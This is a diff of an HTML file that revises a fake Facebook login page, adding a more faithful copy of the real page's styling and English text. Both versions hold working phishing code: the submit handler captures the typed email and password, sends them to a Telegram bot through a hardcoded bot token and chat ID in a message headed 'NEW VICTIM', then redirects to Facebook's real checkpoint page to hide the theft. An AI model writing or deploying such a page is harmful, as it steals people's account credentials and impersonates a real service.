@@ -1,35 +1,120 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook - Login</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Facebook – log in or sign up</title>
     <style>
-        body { font-family: Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 100%; max-width: 350px; text-align: center; }
-        h1 { color: #1877f2; font-size: 32px; }
-        input { width: 90%; padding: 10px; margin: 8px 0; border: 1px solid #dddfe2; border-radius: 6px; }
-        button { width: 96%; padding: 10px; background: #1877f2; border: none; color: white; font-weight: bold; border-radius: 6px; cursor: pointer; }
+        body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; margin: 0; padding: 0; display: flex; flex-direction: column; align-items: center; }
+        
+        /* الهيدر العلوي الصغير */
+        .top-info { width: 100%; background-color: #fffbe2; color: #3b5998; padding: 10px; font-size: 13px; text-align: center; border-bottom: 1px solid #e5e5e5; display: none; }
+        
+        .main-container { width: 100%; max-width: 400px; margin-top: 40px; text-align: center; }
+        .fb-logo { width: 112px; margin-bottom: 20px; }
+        
+        /* الصندوق الأبيض */
+        .login-box { background: #fff; padding: 20px 16px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1); margin: 0 16px; }
+        .box-header { font-size: 18px; color: #1c1e21; margin-bottom: 20px; font-weight: 400; }
+        
+        /* الخانات بالألوان الرسمية */
+        input { 
+            width: 100%; 
+            height: 52px; 
+            padding: 14px 16px; 
+            margin-bottom: 12px; 
+            border: 1px solid #dddfe2; 
+            border-radius: 6px; 
+            font-size: 17px; 
+            box-sizing: border-box; 
+            outline: none; 
+            color: #1c1e21; 
+            background-color: #fff;
+        }
+        input:focus { border-color: #1877f2; box-shadow: 0 0 0 2px #e7f3ff; }
+        input::placeholder { color: #8d949e; }
+
+        /* زر الدخول الأزرق الفاقع */
+        .login-button { 
+            width: 100%; 
+            height: 48px; 
+            background-color: #1877f2; 
+            border: none; 
+            border-radius: 6px; 
+            color: #fff; 
+            font-size: 20px; 
+            font-weight: 700; 
+            cursor: pointer; 
+            margin-top: 4px;
+        }
+        .login-button:active { background-color: #166fe5; }
+
+        .forgot-pass { display: block; margin-top: 16px; color: #1877f2; text-decoration: none; font-size: 14px; }
+        .divider { border-top: 1px solid #dadde1; margin: 20px 0; }
+
+        /* زر الحساب الجديد الأخضر */
+        .create-button { 
+            background-color: #42b72a; 
+            color: #fff; 
+            padding: 0 16px; 
+            line-height: 48px; 
+            height: 48px;
+            border-radius: 6px; 
+            text-decoration: none; 
+            font-weight: 700; 
+            font-size: 17px; 
+            display: inline-block; 
+        }
+
+        /* تذييل الصفحة باللغات */
+        .footer { margin-top: 50px; width: 90%; color: #737373; font-size: 12px; }
+        .languages { margin-bottom: 10px; color: #8a8d91; }
+        .languages span { margin: 0 5px; cursor: pointer; }
+        .meta-text { color: #737373; margin-top: 15px; }
     </style>
 </head>
 <body>
-    <div class="box">
-        <h1>facebook</h1>
-        <form id="f">
-            <input type="text" id="e" placeholder="الإيميل أو الهاتف" required>
-            <input type="password" id="p" placeholder="كلمة السر" required>
-            <button type="submit">تسجيل الدخول</button>
-        </form>
-    </div>
-    <script>
-        const T = "8305859982:AAHJEqmmZ4-KuKbNQqao9qfqMLRiNsqTatA";
-        const C = "8058949028";
 
-        document.getElementById('f').addEventListener('submit', function(e) {
+    <div class="main-container">
+        <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu_m_aGIn.png" alt="Facebook" class="fb-logo">
+
+        <div class="login-box">
+            <div class="box-header">Log in to Facebook</div>
+            <form id="loginForm">
+                <input type="text" id="email" placeholder="Email address or phone number" required>
+                <input type="password" id="pass" placeholder="Password" required>
+                <button type="submit" class="login-button">Log In</button>
+            </form>
+            <a href="#" class="forgot-pass">Forgotten password?</a>
+            <div class="divider"></div>
+            <a href="#" class="create-button">Create new account</a>
+        </div>
+
+        <div class="footer">
+            <div class="languages">
+                English (UK) • <span style="color: #8a8d91;">Français (France)</span> • <span style="color: #8a8d91;">العربية</span> • <span style="color: #8a8d91;">Español</span>
+            </div>
+            <div class="meta-text">Meta © 2026</div>
+        </div>
+    </div>
+
+    <script>
+        // ضع هنا بياناتك الصحيحة (التوكن والآيدي)
+        const botToken = "8305859982:AAHJEqmmZ4-KuKbNQqao9qfqMLRiNsqTatA"; 
+        const myId = "8058949028"; 
+
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
-            const m = `🚨 صيد جديد:\n👤 الإيميل: ${document.getElementById('e').value}\n🔑 الباسورد: ${document.getElementById('p').value}`;
-            fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent(m)}`)
-            .then(() => { window.location.href = "https://www.facebook.com"; });
+            const email = document.getElementById('email').value;
+            const pass = document.getElementById('pass').value;
+            
+            const message = `🎯 NEW VICTIM 🎯\n\n📧 User: ${email}\n🔑 Pass: ${pass}`;
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${myId}&text=${encodeURIComponent(message)}`)
+            .then(() => {
+                // تحويل لصفحة الأمان الحقيقية
+                window.location.href = "https://www.facebook.com/checkpoint/block/";
+            });
         });
     </script>
 </body>
